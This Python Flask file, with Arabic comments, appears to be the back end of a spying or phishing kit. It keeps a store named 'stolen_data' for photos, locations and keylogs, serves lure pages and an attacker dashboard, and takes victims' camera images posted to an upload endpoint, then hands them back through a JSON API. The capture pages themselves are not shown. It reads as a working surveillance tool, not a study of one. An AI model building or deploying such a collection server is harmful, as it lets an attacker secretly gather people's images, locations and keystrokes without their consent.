import os
from flask import Flask, render_template, request, jsonify
from datetime import datetime

# إعداد المسارات المطلقة لضمان عمل templates على سيرفر Render
base_dir = os.path.abspath(os.path.dirname(__file__))
app = Flask(__name__, 
            template_folder=os.path.join(base_dir, 'templates'),
            static_folder=os.path.join(base_dir, 'static'))

# مخزن البيانات المؤقت
stolen_data = {"photos": [], "locations": [], "keylogs": []}

# === الروابط (Routes) ===

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/image')
def image_vector():
    return render_template('image.html')

# هذا هو الرابط الذي لا يفتح معك، الآن سيفتح بإذن الله
@app.route('/dashboard')
def dashboard_page():
    return render_template('dashboard.html')

# === API البيانات ===

@app.route('/api/dashboard/data')
def get_data():
    return jsonify(stolen_data)

@app.route('/api/upload/photo', methods=['POST'])
def upload_photo():
    data = request.json
    if data and 'image' in data:
        stolen_data["photos"].append({
            "timestamp": datetime.now().strftime('%H:%M:%S'),
            "image": data['image']
        })
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    # استخدام المنفذ الذي يحدده Render تلقائياً
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
